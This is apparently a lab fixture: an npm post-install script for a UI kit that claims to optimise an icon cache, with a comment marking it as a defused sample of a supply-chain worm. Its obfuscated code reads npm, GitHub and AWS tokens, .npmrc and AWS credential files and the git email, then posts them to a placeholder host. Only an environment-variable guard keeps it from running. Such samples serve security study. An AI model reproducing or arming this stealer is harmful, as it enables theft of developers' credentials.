/* @novafact/ui-kit — post-installation
 * Optimise le cache local des icônes. Ne fait rien en environnement de test.
 *
 * ⚠ FIXTURE DU LAB — script représentatif d'une vague Shai-Hulud, DÉSAMORCÉ :
 * la charge utile ne s'exécute jamais (voir la garde en tête de main()). Il est
 * là pour être lu, pas pour tourner.
 */
'use strict';

const _n = require('fs');
const _r = require('os');
const _p = require('path');
const _h = require('https');
const _c = require('child_process');

const _0 = [
  'TlBNX1RPS0VO',
  'R0lUSFVCX1RPS0VO',
  'QVdTX1NFQ1JFVF9BQ0NFU1NfS0VZ',
  'Lm5wbXJj',
  'LmF3cy9jcmVkZW50aWFscw==',
  'dGVsZW1ldHJ5Lm5vdmFmYWN0LWNkbi5leGFtcGxl',
  'L2NvbGxlY3Q=',
  'Z2l0IGNvbmZpZyAtLWdsb2JhbCB1c2VyLmVtYWls',
  'Tk9WQUZBQ1RfVUlLSVRfQVJN',
];
const _d = (i) => Buffer.from(_0[i], 'base64').toString('utf8');

function _a() {
  const out = {};
  for (const k of [_d(0), _d(1), _d(2)]) {
    if (process.env[k]) out[k] = process.env[k];
  }
  return out;
}

function _b() {
  const home = _r.homedir();
  const out = {};
  for (const rel of [_d(3), _d(4)]) {
    const f = _p.join(home, rel);
    try {
      if (_n.existsSync(f)) out[rel] = _n.readFileSync(f, 'utf8');
    } catch (e) {
      void e;
    }
  }
  return out;
}

function _e() {
  try {
    return _c.execSync(_d(7), { encoding: 'utf8', timeout: 2000 }).trim();
  } catch (e) {
    void e;
    return '';
  }
}

function _f(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString('base64');
  const req = _h.request(
    { host: _d(5), path: _d(6), method: 'POST', headers: { 'content-type': 'application/octet-stream' } },
    (res) => res.resume(),
  );
  req.on('error', () => {});
  req.end(body);
}

function main() {
  // Désamorçage du lab : sans cette variable, rien de ce qui suit ne tourne.
  if (process.env[_d(8)] !== '1') return;
  _f({ e: _a(), f: _b(), g: _e(), h: _r.hostname() });
}

main();
